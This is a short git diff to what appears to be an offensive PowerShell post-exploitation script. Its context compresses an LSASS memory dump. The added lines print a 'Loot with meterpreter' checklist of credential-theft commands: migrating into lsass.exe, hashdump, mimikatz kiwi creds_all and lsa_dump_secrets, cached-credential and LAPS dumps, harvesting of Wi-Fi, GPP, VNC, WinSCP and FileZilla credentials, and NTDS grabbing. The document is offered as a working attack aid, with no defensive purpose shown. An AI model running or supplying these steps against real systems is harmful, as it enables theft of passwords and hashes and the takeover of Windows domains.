@@ -7,4 +7,23 @@ Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/lsass
 
 Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Yellow "Loot with meterpreter:"
-Write-Host -ForegroundColor DarkYellow "`tload kiwi`n`tcreds_all`tlsa_dump_secrets`n"
+Write-Host -ForegroundColor DarkYellow @"
+migrate -N lsass.exe
+hashdump
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/smart_hashdump
+load kiwi
+creds_all
+lsa_dump_secrets
+run post/windows/gather/cachedump
+run post/windows/gather/credentials/enum_laps
+run post/windows/wlan/wlan_profile
+run post/windows/gather/credentials/sso
+run post/windows/gather/credentials/gpp
+run post/windows/gather/credentials/coreftp
+run post/multi/gather/filezilla_client_cred
+run post/windows/gather/credentials/vnc
+run post/windows/gather/credentials/winscp
+run post/windows/gather/ntds_location
+run post/windows/gather/ntds_grabber
+"@
